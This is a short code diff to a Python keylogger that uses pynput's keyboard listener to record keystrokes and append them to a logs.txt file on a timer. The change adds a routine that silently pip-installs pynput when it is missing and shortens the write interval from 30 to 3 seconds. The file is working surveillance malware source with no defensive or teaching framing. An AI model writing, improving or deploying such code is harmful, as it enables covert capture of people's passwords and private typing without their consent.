@@ -1,8 +1,19 @@
-from pynput.keyboard import Listener
+import pip
 from threading import Timer
 
 log = ''
 
+
+def import_or_install(package):
+    try:
+        __import__(package)
+    except ImportError:
+        pip.main(['install', package])
+
+
+import_or_install('pynput')
+
+from pynput.keyboard import Listener
 
 def report():
     global log
@@ -10,7 +21,7 @@ def report():
         with open('logs.txt', 'a+') as f:
             f.write(log)
         log = ''
-    Timer(30, report).start()
+    Timer(3, report).start()
 
 
 def on_press(key):
